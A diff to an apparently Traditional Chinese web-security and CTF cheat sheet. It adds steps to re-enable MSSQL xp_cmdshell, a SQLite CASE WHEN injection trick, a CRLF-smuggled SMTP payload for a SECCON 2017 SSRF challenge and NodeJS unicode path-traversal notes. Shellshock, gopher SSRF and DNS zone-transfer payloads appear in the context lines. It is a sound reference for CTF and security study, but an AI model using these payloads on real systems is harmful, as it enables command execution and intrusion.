@@ -474,6 +474,26 @@ cat $(ls)
     - 服務端主機名：`select @@servername; `
     - 兩者不同即站庫分離
 
+- xp_cmdshell
+    - 在MSSQL 2000默認開啟
+    - MSSQL 2005之後默認關閉
+    - 有sa權限，可透過sp_configure重啟它
+    
+    ```
+    EXEC sp_configure 'show advanced options',1
+    RECONFIGURE 
+    EXEC sp_configure 'xp_cmdshell',1
+    RECONFIGURE
+    ```
+    - 關閉xp_cmdshell
+    
+    ```
+    EXEC sp_configure 'show advanced options', 1;
+    RECONFIGURE;
+    EXEC sp_configure'xp_cmdshell', 0;
+    RECONFIGURE;
+    ```
+
 ## Oracle
 
 - `SELECT`語句必須包含`FROM`
@@ -523,6 +543,10 @@ cat $(ls)
     - `randomblob(100000000)`
 - 空白字元
     - `0A 0D 0C 09 20`
+- Case when
+    - SQLite沒有`if`
+    - 可以用`Case When ... Then ...`代替
+    - `case when (條件) then ... else ... end`
 - 註解
     - `--`
 - Boolean Based: SECCON 2017 qual SqlSRF
@@ -1020,7 +1044,7 @@ header( "Location: gopher://127.0.0.1:9000/x%01%01Zh%00%08%00%00%00%01%00%00%00%
 
 SECCON 2017 SqlSRF:
 
-`127.0.0.1 %0D%0AHELO sqlsrf.pwn.seccon.jp%0D%0AMAIL FROM%3A %3Ckqqrr18%40gmail.com%3E%0D%0ARCPT TO%3A %3Croot%40localhost%3E%0D%0ADATA%0D%0ASubject%3A give me flag%0D%0Agive me flag%0D%0A.%0D%0AQUIT%0D%0A:25/`
+`127.0.0.1 %0D%0AHELO sqlsrf.pwn.seccon.jp%0D%0AMAIL FROM%3A %3Ckaibrotw%40gmail.com%3E%0D%0ARCPT TO%3A %3Croot%40localhost%3E%0D%0ADATA%0D%0ASubject%3A give me flag%0D%0Agive me flag%0D%0A.%0D%0AQUIT%0D%0A:25/`
 
 ## FingerPrint
 
@@ -1059,9 +1083,11 @@ SSH-2.0-libssh2_1.4.2
 
 ---
 
-SSRF Bible
+SSRF Bible:
 
 https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit
+
+Testing Payload:
 
 https://github.com/cujanovic/SSRF-Testing
 
@@ -1182,7 +1208,7 @@ xxe.dtd:
     
     - `() { :; }; echo vulnerable`
 
-- X-forwarded-for
+- X-forwarded-for偽造來源IP
 
 - DNS Zone Transfer
     - `dig @1.2.3.4 abc.com axfr`
@@ -1190,7 +1216,10 @@ xxe.dtd:
         - Test Domain: `abc.com`
 
 - NodeJS unicode failure
+    - 內部使用UCS-2編碼
     - `ＮＮ` => `..`
+        - `Ｎ` 即 `\xff\x2e`
+        - 轉型時捨棄第一個Byte
 
 
 # Tool & Online Website
